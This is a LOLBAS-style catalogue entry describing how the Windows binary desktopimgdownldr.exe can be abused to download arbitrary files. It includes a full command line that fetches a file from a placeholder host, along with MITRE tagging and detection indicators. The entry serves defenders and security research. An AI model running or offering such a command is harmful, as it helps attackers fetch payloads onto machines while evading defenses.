---
Name: Desktopimgdownldr.exe
Description: Windows binary used to configure lockscreen/desktop image
Author: Gal Kristal
Created: 2020-06-28
Commands:
  - Command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
    Description: Downloads the file and sets it as the computer's lockscreen
    Usecase: Download arbitrary files from a web server
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10
Full_Path:
  - Path: c:\windows\system32\desktopimgdownldr.exe
Code_Sample:
  - Code:
Detection:
  - IOC: desktopimgdownldr.exe that creates non-image file
  - IOC: Change of HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP\LockScreenImageUrl
Resources:
  - Link: https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
Acknowledgement:
  - Person: Gal Kristal
    Handle: '@gal_kristal'
---
